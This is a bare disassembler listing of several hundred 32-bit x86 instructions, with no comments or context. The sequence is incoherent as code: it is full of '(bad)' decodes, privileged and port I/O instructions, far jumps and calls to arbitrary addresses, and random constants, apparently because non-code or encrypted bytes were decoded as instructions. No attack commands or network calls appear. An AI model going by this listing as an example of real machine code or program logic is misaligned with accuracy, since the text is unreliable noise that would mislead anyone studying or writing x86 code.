  6b8107:	rcl    DWORD PTR [edx-0x625aa4c5],0x44
  6b810e:	add    DWORD PTR [edi-0x37f1e925],ebp
  6b8114:	cmc    
  6b8115:	sub    ecx,DWORD PTR [eax+0x5dfeda61]
  6b811b:	mov    WORD PTR [eax+0x7b],fs
  6b811e:	cmc    
  6b811f:	push   ds
  6b8120:	pop    ebp
  6b8121:	pop    ebx
  6b8122:	data16 outs dx,BYTE PTR ds:[esi]
  6b8124:	push   cs
  6b8125:	adc    cl,BYTE PTR ds:0xcf6edcfb
  6b812b:	mov    ebx,DWORD PTR [eax+edx*4+0x68a4f95c]
  6b8132:	adc    BYTE PTR [eax+0x7],ch
  6b8135:	jle    0x6b816a
  6b8137:	mul    BYTE PTR [eax-0x9]
  6b813a:	adc    bh,bh
  6b813c:	mov    ah,BYTE PTR [ecx]
  6b813e:	aad    0x71
  6b8140:	mov    bh,0x5c
  6b8142:	pop    esp
  6b8143:	in     al,0x38
  6b8145:	mov    al,0xf0
  6b8147:	pop    ds
  6b8148:	aad    0xff
  6b814a:	mov    ds,edi
  6b814c:	mul    BYTE PTR [ebx+0x6d]
  6b814f:	mov    fs,WORD PTR [ecx]
  6b8151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b8152:	inc    ebp
  6b8153:	aad    0x71
  6b8155:	adc    ecx,DWORD PTR [ecx]
  6b8157:	dec    esi
  6b8158:	int    0x52
  6b815a:	mov    ebx,0xf2fdf50e
  6b815f:	add    esi,ebp
  6b8161:	mov    eax,0x770e83a
  6b8166:	sbb    DWORD PTR [edi+ebp*2-0x39b0d919],edx
  6b816d:	and    al,BYTE PTR [ebp+edx*8+0x16]
  6b8171:	lods   eax,DWORD PTR ds:[esi]
  6b8172:	daa    
  6b8173:	xor    ebp,ebp
  6b8175:	or     dh,BYTE PTR [edi+0x76fa42f5]
  6b817b:	push   0x41
  6b817d:	lea    ecx,[ebx+0x12b426a6]
  6b8183:	(bad)  
  6b8184:	lahf   
  6b8185:	pop    es
  6b8186:	test   cl,ah
  6b8188:	sbb    DWORD PTR [ebx+0x64d8e900],esi
  6b818e:	loop   0x6b81f9
  6b8190:	mov    dh,0xe6
  6b8192:	or     bl,BYTE PTR [esi+eax*2+0x34cbb97a]
  6b8199:	cmp    bl,BYTE PTR [ebx]
  6b819b:	ja     0x6b81a7
  6b819d:	es inc edx
  6b819f:	jnp    0x6b8169
  6b81a1:	xchg   ecx,eax
  6b81a2:	nop
  6b81a3:	ja     0x6b81ba
  6b81a5:	(bad)  
  6b81a6:	push   eax
  6b81a7:	xchg   ecx,eax
  6b81a8:	jns    0x6b8185
  6b81aa:	lods   al,BYTE PTR ds:[esi]
  6b81ab:	push   ebp
  6b81ac:	cmc    
  6b81ad:	in     eax,dx
  6b81ae:	aad    0x68
  6b81b0:	inc    eax
  6b81b1:	push   0x87edaeae
  6b81b6:	mov    ds:0xfa399860,al
  6b81bb:	dec    ebx
  6b81bc:	pushf  
  6b81bd:	inc    esp
  6b81be:	outs   dx,BYTE PTR ds:[esi]
  6b81bf:	lods   al,BYTE PTR ds:[esi]
  6b81c0:	loopne 0x6b8153
  6b81c2:	ret    0x4453
  6b81c5:	mov    ebp,0x7d67712b
  6b81ca:	cmp    DWORD PTR [ebx-0x6a],esp
  6b81cd:	repnz in eax,0x97
  6b81d0:	xor    al,0x6f
  6b81d2:	inc    edx
  6b81d3:	cmp    al,BYTE PTR [ebx+ebx*1]
  6b81d6:	xor    eax,0x706408d0
  6b81db:	cmp    BYTE PTR [ebp+0x33],cl
  6b81de:	mov    esi,0x121726d0
  6b81e3:	add    ch,BYTE PTR [ebx*1+0x181723df]
  6b81ea:	jno    0x6b820e
  6b81ec:	in     eax,dx
  6b81ed:	push   ebp
  6b81ee:	mov    ebp,0xc0e44586
  6b81f3:	icebp  
  6b81f4:	inc    ebx
  6b81f5:	sub    eax,0xa7ff3c2c
  6b81fa:	adc    eax,ebx
  6b81fc:	push   ss
  6b81fd:	pop    es
  6b81fe:	ror    bl,0x80
  6b8201:	xor    al,0x11
  6b8203:	stos   BYTE PTR es:[edi],al
  6b8204:	out    dx,al
  6b8205:	aam    0x46
  6b8207:	shr    BYTE PTR [edi+ebx*4-0x47944220],0x63
  6b820f:	cs xor eax,0x134cdfa
  6b8215:	retf   0x2f22
  6b8218:	inc    sp
  6b821a:	xchg   esi,eax
  6b821b:	je     0x6b81d7
  6b821d:	js     0x6b81ea
  6b821f:	mov    ecx,0x5ad52619
  6b8224:	push   esi
  6b8225:	add    BYTE PTR [esi-0x3b],bl
  6b8228:	add    DWORD PTR [edx+ecx*8],eax
  6b822b:	nop
  6b822c:	or     ebp,DWORD PTR [edx]
  6b822e:	icebp  
  6b822f:	pusha  
  6b8230:	and    esi,DWORD PTR [ebp+0x32234328]
  6b8236:	aas    
  6b8237:	mov    WORD PTR [edi+0x5ba8f779],es
  6b823d:	sbb    bh,al
  6b823f:	ins    BYTE PTR es:[edi],dx
  6b8240:	xchg   edi,eax
  6b8241:	pop    ebp
  6b8242:	fcmovbe st,st(5)
  6b8244:	jmp    0xa275a863
  6b8249:	(bad)
  6b824e:	ss aad 0xc5
  6b8251:	cmp    edi,0xd4db6fcf
  6b8257:	aad    0x44
  6b8259:	push   edi
  6b825a:	add    edx,edx
  6b825c:	ja     0x6b8298
  6b825e:	mov    ch,0xe0
  6b8260:	mov    ah,BYTE PTR [edx-0x1b]
  6b8263:	rol    BYTE PTR [ebx+0x32a87148],cl
  6b8269:	inc    eax
  6b826a:	or     al,0xe4
  6b826c:	xchg   ecx,eax
  6b826d:	test   al,0xbc
  6b826f:	sub    BYTE PTR [eax-0x22],bl
  6b8272:	or     BYTE PTR [edi+0x53],ch
  6b8275:	lods   al,BYTE PTR ds:[esi]
  6b8276:	dec    ebx
  6b8277:	mov    esi,0xf7653366
  6b827c:	outs   dx,BYTE PTR ds:[esi]
  6b827d:	cli    
  6b827e:	call   0xb9f27ce8
  6b8283:	pop    esp
  6b8284:	or     al,0xf1
  6b8286:	shr    BYTE PTR [ebp+0x3527392f],1
  6b828c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b828d:	sub    ch,dl
  6b828f:	inc    ecx
  6b8290:	pop    ebx
  6b8291:	fisubr DWORD PTR [ebx-0x4e3cb3b8]
  6b8297:	jmp    0xe3796afd
  6b829c:	pop    ebp
  6b829d:	pop    ebp
  6b829e:	add    DWORD PTR [ebp+0x68e977b2],eax
  6b82a4:	hlt    
  6b82a5:	popa   
  6b82a6:	jp     0x6b82d6
  6b82a8:	ins    DWORD PTR es:[edi],dx
  6b82a9:	lahf   
  6b82aa:	mov    bl,0xa4
  6b82ac:	or     DWORD PTR [ebx],esp
  6b82ae:	xchg   esp,eax
  6b82af:	jg     0x6b8314
  6b82b1:	retf   0xacfb
  6b82b4:	test   eax,0xf2a43cf5
  6b82b9:	jbe    0x6b82d2
  6b82bb:	push   esi
  6b82bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b82bd:	repnz stos DWORD PTR es:[edi],eax
  6b82bf:	inc    esi
  6b82c0:	retf   
  6b82c1:	xchg   edi,eax
  6b82c2:	xor    BYTE PTR [edi],bl
  6b82c4:	sbb    al,BYTE PTR [ecx]
  6b82c6:	add    al,0x61
  6b82c8:	pop    ebx
  6b82c9:	mov    esi,0x523c287e
  6b82ce:	and    al,0xae
  6b82d0:	add    eax,eax
  6b82d2:	cmp    BYTE PTR [ebp-0x30],al
  6b82d5:	es cs push es
  6b82d8:	pusha  
  6b82d9:	cmp    al,0xda
  6b82db:	or     dl,dl
  6b82dd:	(bad)
  6b82e0:	js     0x6b8347
  6b82e2:	(bad)  
  6b82e3:	push   ds
  6b82e4:	scas   eax,DWORD PTR es:[edi]
  6b82e5:	inc    esp
  6b82e6:	inc    ebx
  6b82e7:	xor    ebx,DWORD PTR [ebp+0x1c56846d]
  6b82ed:	or     eax,0x2de1b6b0
  6b82f2:	mov    eax,0x2145c451
  6b82f7:	out    dx,eax
  6b82f8:	sbb    edx,edx
  6b82fa:	shl    DWORD PTR [eax-0x67],0x80
  6b82fe:	repz cdq 
  6b8300:	mov    bl,0xeb
  6b8302:	pusha  
  6b8303:	(bad)  
  6b8304:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b8305:	mov    ds:0x4b1b1f53,eax
  6b830a:	cli    
  6b830b:	test   al,0x12
  6b830d:	arpl   WORD PTR [edi+0x1d],bx
  6b8310:	adc    bh,BYTE PTR [ecx+eiz*4+0x7]
  6b8314:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b8315:	jns    0x6b8389
  6b8317:	xchg   ch,ah
  6b8319:	xchg   DWORD PTR [ecx-0xa],ecx
  6b831c:	in     eax,0x58
  6b831e:	rcl    BYTE PTR [edi],cl
  6b8320:	jne    0x6b82df
  6b8322:	rcr    BYTE PTR [edi-0x6e],cl
  6b8325:	inc    ebp
  6b8326:	adc    al,0xea
  6b8328:	fsubp  st(3),st
  6b832a:	and    BYTE PTR [edi+ebx*4-0x48],ah
  6b832e:	lahf   
  6b832f:	sbb    al,0x4c
  6b8331:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b8332:	pop    es
  6b8333:	or     ecx,ebp
  6b8335:	jb     0x6b836d
  6b8337:	jno    0x6b8345
  6b8339:	enter  0xb812,0x49
  6b833d:	pop    es
  6b833e:	add    ebx,DWORD PTR [eax+0x1a683e3]
  6b8344:	jns    0x6b8302
  6b8346:	jo     0x6b82ed
  6b8348:	gs ins BYTE PTR es:[edi],dx
  6b834a:	sahf   
  6b834b:	es icebp 
  6b834d:	or     eax,0x214cdb19
  6b8352:	mov    bl,0x99
  6b8354:	call   0x5f71:0xe546e308
  6b835b:	dec    ecx
  6b835c:	xor    DWORD PTR [ecx+0x303fd8b],edx
  6b8362:	aam    0x4c
  6b8364:	out    0x58,al
  6b8366:	rcl    DWORD PTR [edx+edi*8-0x5b],1
  6b836a:	push   ecx
  6b836b:	and    edx,DWORD PTR [eax-0x7540d915]
  6b8371:	bnd js 0x6b8351
  6b8374:	xchg   ecx,eax
  6b8375:	hlt    
  6b8376:	popa   
  6b8377:	cmp    esp,DWORD PTR [ecx*1-0xa26a210]
  6b837e:	mov    DWORD PTR [ecx],0xf4a964f0
  6b8384:	push   0xacc45585
  6b8389:	jg     0x6b8350
  6b838b:	lea    eax,[esi+edx*8+0x7c0669c9]
  6b8392:	call   0xb94a:0xb4d3b39
  6b8399:	dec    esi
  6b839a:	lgs    ecx,FWORD PTR ss:[edi]
  6b839e:	int3   
  6b839f:	(bad)  
  6b83a0:	ins    DWORD PTR es:[edi],dx
  6b83a1:	jno    0x6b8362
  6b83a3:	div    DWORD PTR [ebx]
  6b83a5:	aam    0x5c
  6b83a7:	stos   BYTE PTR es:[edi],al
  6b83a8:	adc    al,0xf0
  6b83aa:	(bad)  
  6b83ac:	xchg   DWORD PTR [ebp+ecx*4+0x1ad567bd],edx
  6b83b3:	sub    DWORD PTR [edx],esi
  6b83b5:	enter  0x2a12,0x1d
  6b83b9:	mov    dl,0xe0
  6b83bb:	push   edx
  6b83bc:	push   ecx
  6b83bd:	push   esi
  6b83be:	loopne 0x6b83c1
  6b83c0:	ret    0xc81c
  6b83c3:	push   ebx
  6b83c4:	jo     0x6b8431
  6b83c6:	sub    ebp,DWORD PTR [eax+0x74]
  6b83c9:	pop    ecx
  6b83ca:	(bad)  
  6b83cb:	sti    
  6b83cc:	mov    bh,0xb5
  6b83ce:	lds    esi,FWORD PTR [ebx+eiz*1]
  6b83d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b83d2:	xlat   BYTE PTR ds:[ebx]
  6b83d3:	jmp    FWORD PTR [ecx+0x19856ebd]
  6b83d9:	stc    
  6b83da:	xchg   ebp,eax
  6b83db:	shr    ebx,0x2
  6b83de:	push   ds
  6b83df:	hlt    
  6b83e0:	xchg   esp,eax
  6b83e1:	gs daa 
  6b83e3:	push   ebx
  6b83e4:	dec    eax
  6b83e5:	lods   al,BYTE PTR ds:[esi]
  6b83e6:	mov    dl,0xa6
  6b83e8:	out    0x4f,eax
  6b83ea:	aas    
  6b83eb:	(bad)  
  6b83ec:	in     eax,dx
  6b83ed:	retf   
  6b83ee:	cwde   
  6b83ef:	fmul   DWORD PTR [ecx]
  6b83f1:	repz inc ecx
  6b83f3:	add    DWORD PTR [ecx+0x2761e327],ebp
  6b83f9:	push   0xffffffb2
  6b83fb:	repz mov ah,BYTE PTR [edx]
  6b83fe:	xor    ebp,DWORD PTR [ebx+eiz*8+0xe]
  6b8402:	stos   DWORD PTR es:[edi],eax
  6b8403:	das    
  6b8404:	stos   DWORD PTR es:[edi],eax
  6b8405:	pop    ebx
  6b8406:	lea    esp,[ecx-0x3ef7d8f0]
  6b840c:	sub    ebx,DWORD PTR [edi]
  6b840e:	sbb    ecx,DWORD PTR [edx]
  6b8410:	scas   al,BYTE PTR es:[edi]
  6b8411:	repz pusha 
  6b8413:	popa   
  6b8414:	mov    al,ds:0x4ebdbd3a
  6b8419:	pusha  
  6b841a:	and    ah,BYTE PTR [ebp+ebp*2+0x70]
  6b841e:	pop    edi
  6b841f:	and    BYTE PTR [ecx+0x45],al
  6b8422:	add    BYTE PTR [ecx-0xd],dl
  6b8425:	sbb    BYTE PTR [ebp+0x1f6efef8],bl
  6b842b:	xchg   BYTE PTR [ebx+ebx*4],dh
  6b842e:	inc    ebx
  6b842f:	or     BYTE PTR [ecx],dl
  6b8431:	adc    eax,0x68ffb7fb
  6b8436:	(bad)  
  6b8437:	loopne 0x6b841f
  6b8439:	clc    
  6b843a:	cdq    
  6b843b:	(bad)  
  6b843c:	in     eax,dx
  6b843d:	jle    0x6b83cd
  6b843f:	push   es
  6b8440:	dec    ecx
  6b8441:	mov    esp,0x3370df05
  6b8446:	pushf  
  6b8447:	adc    bl,BYTE PTR [ebx+0x2a2e16d2]
  6b844d:	out    dx,al
  6b844e:	jl     0x6b8443
  6b8450:	push   cs
  6b8451:	ds iret 
  6b8453:	dec    eax
  6b8454:	mov    ch,BYTE PTR [ebp-0x7a]
  6b8457:	hlt    
  6b8458:	fsubr  st,st(2)
  6b845a:	or     al,0xd
  6b845c:	inc    ecx
  6b845d:	dec    dx
  6b845f:	hlt    
  6b8460:	mov    eax,ds:0x491f7edf
  6b8465:	inc    esi
  6b8466:	or     BYTE PTR [esi+ecx*8],dh
  6b8469:	aam    0x1
  6b846b:	push   0xffffffb3
  6b846d:	xchg   esp,eax
  6b846e:	dec    eax
  6b846f:	and    eax,0x2b3cec71
  6b8474:	xor    esp,esp
  6b8476:	or     eax,0xdddaeec2
  6b847b:	jb     0x6b8448
  6b847d:	mov    bl,0x3e
  6b847f:	lods   al,BYTE PTR gs:[esi]
  6b8481:	lahf   
  6b8482:	xor    eax,0x7c02b68c
  6b8487:	jecxz  0x6b8416
  6b8489:	jmp    0xbf9abca8
  6b848e:	mov    al,ds:0xb12351d3
  6b8493:	sub    eax,0xe8dd78b
  6b8498:	(bad)  
  6b8499:	sub    esi,DWORD PTR [edi-0x54]
  6b849c:	mov    ds:0x3095b9af,eax
  6b84a1:	adc    ecx,DWORD PTR [ebx]
  6b84a3:	jecxz  0x6b84a5
  6b84a5:	nop
  6b84a6:	add    edi,DWORD PTR [edx+ecx*1]
  6b84a9:	test   eax,0xd73c6e0e
  6b84ae:	mov    bl,0x67
  6b84b0:	jae    0x6b8441
  6b84b2:	enter  0x4e79,0x14
  6b84b6:	stos   DWORD PTR es:[edi],eax
  6b84b7:	and    DWORD PTR [ecx],ebp
  6b84b9:	sbb    eax,0x336dd4e1
  6b84be:	idiv   DWORD PTR [edx+edi*1-0x1e]
  6b84c2:	fisttp WORD PTR [ebp+0x7dbffe3b]
  6b84c8:	sub    al,0xc8
  6b84ca:	ret    0xe2d6
  6b84cd:	sbb    DWORD PTR [edi],ebp
  6b84cf:	das    
  6b84d0:	hlt    
  6b84d1:	in     al,dx
  6b84d2:	pop    esp
  6b84d3:	popa   
  6b84d4:	pop    es
  6b84d5:	push   eax
  6b84d6:	pop    ebx
  6b84d7:	push   ds
  6b84d8:	xchg   edi,eax
  6b84d9:	mov    esi,0x6bf23728
  6b84de:	(bad)  
  6b84df:	ins    DWORD PTR es:[edi],dx
  6b84e0:	sub    bh,BYTE PTR [ebx+0xa]
  6b84e3:	call   0x986ed92d
  6b84e8:	or     edx,DWORD PTR [edx+0x7e]
  6b84eb:	add    eax,0x5d556041
  6b84f0:	adc    DWORD PTR [edx+ebp*8],ecx
  6b84f3:	add    eax,0x56dcf169
  6b84f8:	arpl   WORD PTR [edx-0x2fc3079d],bx
  6b84fe:	add    BYTE PTR [edi-0x72],ah
  6b8501:	inc    esi
  6b8502:	neg    al
  6b8504:	pop    ds
  6b8505:	inc    ebp
  6b8506:	neg    BYTE PTR [ebp-0x2d]
  6b8509:	jnp    0x6b84b1
  6b850b:	daa    
  6b850c:	cwde   
  6b850d:	mov    edx,0x47312c5a
  6b8512:	ficomp DWORD PTR [ecx+esi*4-0x46]
  6b8516:	ja     0x6b84c3
  6b8518:	pop    ebx
  6b8519:	inc    eax
  6b851a:	adc    BYTE PTR [esi+0x7d],dh
  6b851d:	std    
  6b851e:	mov    al,BYTE PTR [edx+0x65dfd82a]
  6b8524:	and    al,0xd4
  6b8526:	daa    
  6b8527:	dec    ebp
  6b8528:	or     BYTE PTR [ebp+0x68],dl
  6b852b:	mov    esi,0x12746aaa
  6b8530:	ret    
  6b8531:	xchg   DWORD PTR cs:[edi+0x32de83a7],ebp
  6b8538:	aam    0xe8
  6b853a:	iret   
  6b853b:	cli    
  6b853c:	cmp    al,0x3b
  6b853e:	mov    ss,ebx
  6b8540:	cld    
  6b8541:	pop    edi
  6b8542:	leave  
  6b8543:	sbb    al,0x3b
  6b8545:	out    0xce,al
  6b8547:	or     cl,BYTE PTR [ebx+0x5fd7911c]
  6b854d:	test   BYTE PTR [ebx],dh
  6b854f:	jmp    0x6b859e
  6b8551:	mov    eax,ds:0xe230ce24
  6b8556:	pop    es
  6b8557:	lock dec esi
  6b8559:	out    0xf7,eax
  6b855b:	cwde   
  6b855c:	mov    BYTE PTR [edx],dh
  6b855e:	(bad)
  6b8563:	pop    edx
  6b8564:	ret    0xabbb
  6b8567:	adc    al,0x3
  6b8569:	test   BYTE PTR [ebx+0x2852f347],ah
  6b856f:	sar    DWORD PTR [esi],0x19
  6b8572:	xlat   BYTE PTR ds:[ebx]
  6b8573:	mov    dl,0x3
  6b8575:	pop    ds
  6b8576:	iret   
  6b8577:	push   ss
  6b8578:	(bad)  
  6b857a:	xchg   ecx,eax
  6b857b:	cmp    dh,BYTE PTR [eax+0x2b]
  6b857e:	mov    dh,0x97
  6b8580:	pop    ebx
  6b8581:	mov    esp,0x137734fa
  6b8586:	fsubr  QWORD PTR [edx]
  6b8588:	mov    ds:0x63a0450a,al
  6b858d:	into   
  6b858e:	and    al,0xa4
  6b8590:	ss mov dl,0x71
  6b8593:	xor    al,0x3
  6b8595:	adc    dh,bh
  6b8597:	and    eax,0x7dbcece2
  6b859c:	push   ebx
  6b859d:	imul   esi,edx,0x4f1d13d9
  6b85a3:	xchg   esp,eax
  6b85a4:	dec    ebp
  6b85a5:	addr16 fcmovnbe st,st(1)
  6b85a8:	out    dx,al
  6b85a9:	dec    BYTE PTR [eax]
  6b85ab:	mov    esp,0x7ac78545
  6b85b0:	int    0x90
  6b85b2:	push   ebp
  6b85b3:	push   es
  6b85b4:	push   cs
  6b85b5:	adc    dl,BYTE PTR [ebx+ecx*4+0x7ce51f2f]
  6b85bc:	and    eax,0xd6577877
  6b85c1:	mov    edi,DWORD PTR [eax+0x3cafe70f]
  6b85c7:	cmp    eax,0x2f11584e
  6b85cc:	sub    DWORD PTR ds:0x9f1771c1,edx
  6b85d2:	pop    edi
  6b85d3:	pusha  
  6b85d4:	jb     0x6b861e
  6b85d6:	shl    BYTE PTR [esp+ebp*4],cl
  6b85d9:	add    BYTE PTR [ecx],0x27
  6b85dc:	mov    al,0x4e
  6b85de:	sar    BYTE PTR [ebx+0x63],0x9a
  6b85e2:	imul   ebx,DWORD PTR [eax+0x1e],0x95ad47db
  6b85e9:	enter  0x9172,0xe8
  6b85ed:	lods   al,BYTE PTR ds:[esi]
  6b85ee:	aad    0x20
  6b85f0:	jbe    0x6b8609
  6b85f2:	pop    edi
  6b85f3:	and    bl,BYTE PTR [edi+0x19416d42]
  6b85f9:	push   cs
  6b85fa:	jno    0x6b85d1
  6b85fc:	lock ds pushf 
  6b85ff:	fst    QWORD PTR [ebx+0x2c]
  6b8602:	push   edx
  6b8603:	mov    eax,0x68d6756b
  6b8608:	scas   al,BYTE PTR es:[edi]
  6b8609:	loope  0x6b85b8
  6b860b:	(bad)  
  6b860c:	push   DWORD PTR [esi+0x1b]
  6b860f:	pop    ecx
  6b8610:	cmp    eax,esi
  6b8612:	cwde   
  6b8613:	mov    bh,0x9f
  6b8615:	dec    ebx
  6b8616:	jbe    0x6b85c9
  6b8618:	adc    al,0x8d
  6b861a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b861b:	call   0x53e9:0xeac522fe
  6b8622:	jno    0x6b861c
  6b8624:	push   edx
  6b8625:	and    eax,0xb05ed4f7
  6b862a:	dec    ebx
  6b862b:	push   ecx
  6b862c:	div    DWORD PTR [ecx+edx*2+0x79]
  6b8630:	lock pop edx
  6b8632:	cwde   
  6b8633:	inc    ebx
  6b8634:	pop    esi
  6b8635:	ficom  WORD PTR ds:0x6770baf6
  6b863b:	fld    QWORD PTR [eax-0x38]
  6b863e:	sub    ebp,DWORD PTR ds:[edi-0x41]
  6b8642:	jns    0x6b85f9
  6b8644:	aaa    
  6b8645:	cwde   
  6b8646:	mov    ch,0xcf
  6b8648:	ret    0x1716
  6b864b:	inc    ebp
  6b864c:	dec    edx
  6b864d:	outs   dx,BYTE PTR ds:[esi]
  6b864e:	inc    ebp
  6b864f:	lea    ebp,[ebx]
  6b8651:	add    al,0x3a
  6b8653:	xchg   esp,eax
  6b8654:	inc    esp
  6b8655:	lahf   
  6b8656:	jno    0x6b8696
  6b8658:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  6b865a:	retf   0xb94b
  6b865d:	fisttp QWORD PTR [ebp-0xb48108f]
  6b8663:	jle    0x6b8604
  6b8665:	jmp    0x6b8614
  6b8667:	pusha  
  6b8668:	add    ebx,DWORD PTR [ebp+ebx*1+0x6c5b02e9]
  6b866f:	pop    ss
  6b8670:	xchg   ecx,eax
  6b8671:	pop    ebx
  6b8672:	je     0x6b8677
  6b8674:	in     eax,dx
  6b8675:	xor    DWORD PTR [ebp+0x37],ebx
  6b8678:	dec    edx
  6b8679:	(bad)  
  6b867b:	enter  0x2534,0x1d
  6b867f:	stos   DWORD PTR es:[edi],eax
  6b8680:	test   BYTE PTR [esp+ebx*1],bl
  6b8683:	xor    ebp,DWORD PTR [ebp-0x2d]
  6b8686:	push   cs
  6b8687:	in     al,dx
  6b8688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b8689:	call   FWORD PTR ds:0x5617a782
  6b868f:	inc    esp
  6b8690:	sbb    cl,BYTE PTR [edx+0x37]
  6b8693:	pop    ebx
  6b8694:	call   0xe72084f7
  6b8699:	fsub   DWORD PTR [bp+si-0x5935]
  6b869e:	xchg   ecx,eax
  6b869f:	icebp  
  6b86a0:	out    0x2b,eax
  6b86a2:	sub    edi,DWORD PTR [ebx]
  6b86a4:	lods   eax,DWORD PTR ds:[esi]
  6b86a5:	call   0x93998ecc
  6b86aa:	or     BYTE PTR [ebp-0x22cbc226],bh
  6b86b0:	popa   
  6b86b1:	pop    eax
  6b86b2:	mov    al,0x25
  6b86b4:	mov    WORD PTR [edx+0x2e5e77a3],?
  6b86ba:	icebp  
  6b86bb:	(bad)  
  6b86bd:	or     al,0xc6
  6b86bf:	or     al,0xa5
  6b86c1:	sti    
  6b86c2:	aam    0x21
  6b86c4:	in     eax,dx
  6b86c5:	lahf   
  6b86c6:	push   0x8
  6b86c8:	in     eax,0xb5
  6b86ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b86cb:	mov    ah,0xd1
  6b86cd:	pop    edx
  6b86ce:	ror    ebp,0x3e
  6b86d1:	mov    ebp,0x752205d8
  6b86d6:	ror    eax,0xf9
  6b86d9:	cld    
  6b86da:	fbld   TBYTE PTR [eax+eiz*2+0x5081a976]
  6b86e1:	fcomp  DWORD PTR [edi-0x6d1a5a4b]
  6b86e7:	aas    
  6b86e8:	sbb    BYTE PTR [esi],bh
  6b86ea:	pop    esi
  6b86eb:	mov    gs,WORD PTR [ecx]
  6b86ed:	mov    eax,ds:0xd3c08a7d
  6b86f2:	cmp    esp,edi
  6b86f4:	not    BYTE PTR [edi+edx*2-0x42250228]
  6b86fb:	retf   
  6b86fc:	hlt    
  6b86fd:	cmp    esi,ecx
  6b86ff:	ficomp DWORD PTR [edi]
  6b8701:	aad    0x2a
  6b8703:	scas   al,BYTE PTR es:[edi]
  6b8704:	je     0x6b86f7
  6b8706:	retf   0x86cd
  6b8709:	data16 sub cl,ah
  6b870c:	jl     0x6b876e
  6b870e:	mov    dh,0xe3
  6b8710:	mov    cl,0x3e
  6b8712:	mov    cs,esp
  6b8714:	(bad)  
  6b8715:	into   
  6b8716:	sub    al,0x62
  6b8718:	jb     0x6b878b
  6b871a:	adc    bl,al
  6b871c:	addr16 in eax,dx
  6b871e:	pop    ebp
  6b871f:	mov    DWORD PTR [edi+0x42],edi
  6b8722:	adc    eax,ebx
  6b8724:	je     0x6b8718
  6b8726:	fsub   QWORD PTR [edx+ecx*1-0x60]
  6b872a:	inc    eax
  6b872b:	pop    ebp
  6b872c:	sub    al,0xdb
  6b872e:	mov    esi,0xbf29e65a
  6b8733:	lds    ebx,FWORD PTR [esi]
  6b8735:	sub    DWORD PTR [ecx+eiz*2],ebp
  6b8738:	jle    0x6b86d5
  6b873a:	mov    esp,0xbcf2a86a
  6b873f:	int3   
  6b8740:	dec    DWORD PTR [bx+0x39]
  6b8744:	inc    ebx
  6b8745:	sbb    DWORD PTR [edx+0x7ebb9fc2],ebp
  6b874b:	push   0xffffffc6
  6b874d:	mov    al,0xfe
  6b874f:	imul   esi,DWORD PTR [edx-0x163c13bc],0xfffffff9
  6b8756:	retf   0x734c
  6b8759:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  6b875b:	sub    BYTE PTR [edx],ch
  6b875d:	cld    
  6b875e:	cld    
  6b875f:	rcl    DWORD PTR [ebp-0x4],0xab
  6b8763:	out    dx,al
  6b8764:	cmp    eax,0x6b88f0dd
  6b8769:	shl    BYTE PTR [eax],1
  6b876b:	je     0x6b8748
  6b876d:	and    eax,0x7e9af60d
  6b8772:	test   eax,0x244876b8
  6b8777:	sti    
  6b8778:	inc    eax
  6b8779:	mov    ecx,0xc7bf637b
  6b877e:	cdq    
  6b877f:	xchg   ecx,eax
  6b8780:	mul    BYTE PTR [ecx]
  6b8782:	maxps  xmm6,xmm3
  6b8785:	and    al,0x2
  6b8787:	jo     0x6b87b6
  6b8789:	test   BYTE PTR [edi-0x7a],ah
  6b878c:	adc    bl,al
  6b878e:	jmp    0x2d58:0xc3b8ae95
  6b8795:	adc    eax,DWORD PTR [eax-0x13]
  6b8798:	mov    WORD PTR [eax+0x6c468dcd],gs
  6b879e:	ss ret 
  6b87a0:	pop    esp
  6b87a1:	aaa    
  6b87a2:	scas   eax,DWORD PTR es:[edi]
  6b87a3:	jp     0x6b87f9
  6b87a5:	daa    
  6b87a6:	mov    esp,0xc17eb5de
  6b87ab:	(bad)  
  6b87ac:	ficomp DWORD PTR [edi+0x3c]
  6b87af:	into   
  6b87b0:	mov    eax,ds:0x2b41ca3a
  6b87b5:	mov    eax,ds:0x60aceb3
  6b87ba:	aas    
  6b87bb:	fistp  WORD PTR [esi+ebp*1-0x28ad4475]
  6b87c2:	daa    
  6b87c3:	sub    edi,DWORD PTR [eax-0x7bb0479b]
  6b87c9:	inc    ebp
  6b87ca:	dec    eax
  6b87cb:	ds inc eax
  6b87cd:	xchg   esp,eax
  6b87ce:	ds popa 
  6b87d0:	mov    ch,0x9a
  6b87d2:	inc    esi
  6b87d3:	popa   
  6b87d4:	cmp    BYTE PTR [ebp+0x4f],0x42
  6b87d8:	sbb    dh,BYTE PTR [esi+0x4bbd523c]
  6b87de:	sbb    bl,BYTE PTR [edx-0x37eab34c]
  6b87e4:	out    0x47,eax
  6b87e6:	push   ss
  6b87e7:	cmp    al,0x7b
  6b87e9:	jns    0x6b8869
  6b87eb:	iret   
  6b87ec:	ja     0x6b87be
  6b87ee:	repnz rcr DWORD PTR [edi-0x47],cl
  6b87f2:	(bad)  
  6b87f3:	adc    edx,DWORD PTR [ecx-0x71]
  6b87f6:	stc    
  6b87f7:	pop    ss
  6b87f8:	push   0x37
  6b87fa:	test   al,0xc
  6b87fc:	mov    dh,0xa0
  6b87fe:	pop    es
  6b87ff:	xor    edx,DWORD PTR [edi]
  6b8801:	sub    eax,0x861a5dc0
  6b8806:	inc    edi
  6b8807:	mov    edx,0x14e44f53
  6b880c:	enter  0x1a7a,0x80
  6b8810:	and    edi,DWORD PTR [ebp-0x7e]
  6b8813:	push   ds
  6b8814:	push   es
  6b8815:	cld    
  6b8816:	inc    ebp
  6b8817:	icebp  
  6b8818:	dec    ebp
  6b8819:	(bad)  
  6b881a:	pop    edx
  6b881b:	push   ecx
  6b881c:	fild   QWORD PTR [esi+0x2c]
  6b881f:	gs adc al,0x96
  6b8822:	sub    DWORD PTR [edx+0x76662b1f],eax
  6b8828:	test   eax,0x40e82571
  6b882d:	out    0x4c,eax
